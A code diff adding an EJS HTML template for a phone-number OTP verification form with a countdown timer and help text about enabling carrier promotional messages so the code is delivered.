@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Number Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        form {
+            margin-top: 20px;
+        }
+        label {
+            display: inline-block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        button[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        #countdown {
+            text-align: center;
+            color: red;
+            font-size: 20px;
+            margin-top: 10px;
+        }
+        .blink {
+            animation: blink-animation 0.5s infinite alternate;
+        }
+        @keyframes blink-animation {
+            from {
+                opacity: 1;
+            }
+            to {
+                opacity: 0;
+            }
+        }
+        .help-text {
+            font-size: smaller;
+            color: black;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Phone Number Verification</h1>
+        <form id="verificationForm" action="/verify_otp1" method="POST">
+            <input type="hidden" name="phoneNumber" value="<%= phoneNumber %>">
+            <input type="hidden" name="username" value="<%= username %>">
+            <input type="hidden" name="investmentAmount" value="<%= investmentAmount %>">
+            <label for="verificationCode">Enter Verification Code:</label>
+            <input type="text" id="verificationCode" name="enteredOTP" required>
+            <button type="submit">Verify</button>
+        </form>
+        <div id="countdown">OTP expires in: 60 seconds</div>
+        <div id="helpText" class="help-text" style="display: none;">Not receiving the code? Dial *456*9#, choose option 5 ('Marketing messages'), then option 5 ('Activate all promo messages'), and resend the OTP.</div>
+    </div>
+
+    <script>
+        // Log the entered OTP
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            const enteredOTP = document.getElementById('verificationCode').value;
+            console.log('Entered OTP:', enteredOTP); // Log the entered OTP
+        });
+
+        // Countdown timer
+        let countdown = 60;
+        const countdownElement = document.getElementById('countdown');
+        const helpTextElement = document.getElementById('helpText');
+        const interval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = `OTP expires in: ${countdown} seconds`;
+            if (countdown <= 0) {
+                clearInterval(interval);
+                countdownElement.classList.add('blink'); // Make the message blink
+                countdownElement.textContent = 'OTP has expired';
+
+                // Show the help text
+                helpTextElement.style.display = 'block';
+
+                // Optionally disable the form submission if OTP has expired
+                document.getElementById('verificationForm').querySelector('button[type="submit"]').disabled = true;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
